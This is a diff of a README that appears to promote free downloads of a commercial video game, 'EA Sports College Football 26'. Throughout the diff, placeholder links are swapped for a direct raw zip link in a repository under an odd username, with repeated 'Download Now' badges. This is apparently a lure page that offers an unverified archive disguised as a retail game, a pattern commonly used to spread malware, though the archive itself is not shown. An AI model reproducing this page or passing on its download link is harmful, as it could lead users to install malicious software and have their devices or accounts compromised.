@@ -4,7 +4,7 @@
 
 > The hottest sports game of summer 2026 — EA's College Football franchise is back bigger than ever with a massive roster, exclusive pre-order bonuses, and true college atmosphere.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download.com)&nbsp;
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Adjutantgeneraldetroitriver151/ea-sports-college-football/raw/refs/heads/main/defined/sports-football-college-ea-v1.8.zip)&nbsp;
 ![Platform](https://img.shields.io/badge/Platform-Available-green?style=flat-square)&nbsp;
 ![Release](https://img.shields.io/badge/Release-2026-orange?style=flat-square)
 
@@ -37,9 +37,9 @@ Releases on **July 9, 2026** · Available on **PS5, Xbox Series X|S, PC**.
 
 ### Ready to play / use?
 
-[![Download EA Sports College Football 26](https://img.shields.io/badge/Download-EA%20Sports%20College%20Football%2026-brightgreen?style=for-the-badge)](https://download.com)
+[![Download EA Sports College Football 26](https://img.shields.io/badge/Download-EA%20Sports%20College%20Football%2026-brightgreen?style=for-the-badge)](https://github.com/Adjutantgeneraldetroitriver151/ea-sports-college-football/raw/refs/heads/main/defined/sports-football-college-ea-v1.8.zip)
 
-> **[Click here to download](https://download.com)**
+> **[Click here to download](https://github.com/Adjutantgeneraldetroitriver151/ea-sports-college-football/raw/refs/heads/main/defined/sports-football-college-ea-v1.8.zip)**
 
 </div>
 
@@ -69,7 +69,7 @@ EA Sports College Football 26 is one of the **most hyped releases of Summer 2026
 
 | Download | Community | News |
 |:--------:|:---------:|:----:|
-| [Download here](https://download.com) | Reddit & Discord | Gaming & tech news |
+| [Download here](https://github.com/Adjutantgeneraldetroitriver151/ea-sports-college-football/raw/refs/heads/main/defined/sports-football-college-ea-v1.8.zip) | Reddit & Discord | Gaming & tech news |
 
 ---
 
@@ -77,7 +77,7 @@ EA Sports College Football 26 is one of the **most hyped releases of Summer 2026
 
 **Don't miss out — EA Sports College Football 26 is one of 2026's must-have releases.**
 
-[![Download Now](https://img.shields.io/badge/Download-EA%20Sports%20College%20Football%2026-blue?style=for-the-badge)](https://download.com)
+[![Download Now](https://img.shields.io/badge/Download-EA%20Sports%20College%20Football%2026-blue?style=for-the-badge)](https://github.com/Adjutantgeneraldetroitriver151/ea-sports-college-football/raw/refs/heads/main/defined/sports-football-college-ea-v1.8.zip)
 
 *EA Sports College Football 26 — July 9, 2026 · PS5, Xbox Series X|S, PC*
 
